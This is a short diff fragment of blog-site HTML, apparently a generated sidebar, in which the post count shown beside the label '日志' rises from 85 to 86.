-                <span class="site-state-item-count">85</span>
+                <span class="site-state-item-count">86</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
